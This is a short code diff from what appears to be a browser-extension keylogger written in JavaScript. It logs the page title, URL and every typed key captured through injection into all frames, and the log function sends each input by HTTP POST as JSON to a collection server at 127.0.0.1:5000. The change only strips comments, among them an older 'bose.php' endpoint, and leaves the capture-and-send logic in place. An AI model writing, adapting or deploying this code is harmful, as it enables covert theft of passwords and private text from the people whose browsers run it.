@@ -57,19 +57,16 @@ data[time] = document.title + "^~^" + document.URL + "^~^";
 // Send logs
 function log(input) {
     var now = new Date().getTime();
-    if (now - lastLog < 10) return; // Remove duplicate keys (typed within 10 ms) caused by allFrames injection
+    if (now - lastLog < 10) return;
     data[time] += input;
     shouldSave = true;
     lastLog = now;
     const Http = new XMLHttpRequest();
     var json = '{"Log":'+input+'}';
-    //const url='http://127.0.0.1:8000/bose.php?h='+input;
     const url='http://127.0.0.1:5000/';
     Http.open("POST", url);
-    //Http.setRequestHeader("h", input);
     Http.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
     Http.send(JSON.stringify({ "Log": input}));
-    //Http.send();
     Http.onreadystatechange=(e)=>{
     console.log(Http.responseText)
     }
